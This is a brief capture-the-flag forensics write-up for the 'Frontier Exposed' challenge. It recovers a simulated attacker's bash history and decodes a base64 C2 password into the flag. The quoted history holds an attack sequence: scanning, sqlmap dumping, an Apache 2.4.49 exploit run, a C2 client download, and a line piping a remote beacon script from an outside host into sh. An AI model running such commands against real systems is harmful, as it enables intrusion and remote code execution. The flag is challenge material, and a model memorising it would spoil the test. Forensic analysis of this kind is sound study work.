---
title: "Frontier Exposed"
description: "The chaos within the Frontier Cluster is relentless, with malicious actors exploiting vulnerabilities to establish footholds across the expanse. During routine surveillance, an open directory vulnerability was identified on a web server, suggesting suspicious activities tied to the Frontier Board. Your mission is to thoroughly investigate the server and determine a strategy to dismantle their infrastructure. Any credentials uncovered during the investigation would prove invaluable in achieving this objective. Spawn the docker and start the investigation!"
pubDate: 2024-12-17
ctf: "HackTheBox University CTF 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-htbuni/icon.png"
---



Opening the files, the first thing I check is the `.bash_history` as generally it helps with retracing an attackers steps.

```
nmap -sC -sV nmap_scan_results.txt jackcolt.dev
cat nmap_scan_results.txt
gobuster dir -u http://jackcolt.dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o dirs.txt
nc -zv jackcolt.dev 1-65535
curl -v http://jackcolt.dev
nikto -h http://jackcolt.dev
sqlmap -u "http://jackcolt.dev/login.php" --batch --dump-all
searchsploit apache 2.4.49
wget https://www.exploit-db.com/download/50383 -O exploit.sh
chmod u+x exploit.sh
echo "http://jackcolt.dev" > target.txt
./exploit target.txt /bin/sh whoami
wget https://notthefrontierboard/c2client -O c2client
chmod +x c2client
/c2client --server 'https://notthefrontierboard' --port 4444 --user admin --password SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9
./exploit target.txt /bin/sh 'curl http://notthefrontierboard/files/beacon.sh|sh'
wget https://raw.githubusercontent.com/vulmon/Vulmap/refs/heads/master/Vulmap-Linux/vulmap-linux.py -O vulnmap-linux.py
cp vulnmap-linux.py /var/www/html
```

I spot the password as a base64 string: `SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9`, which is the flag.

Flag: `HTB{C2_cr3d3nt14ls_3xp0s3d}`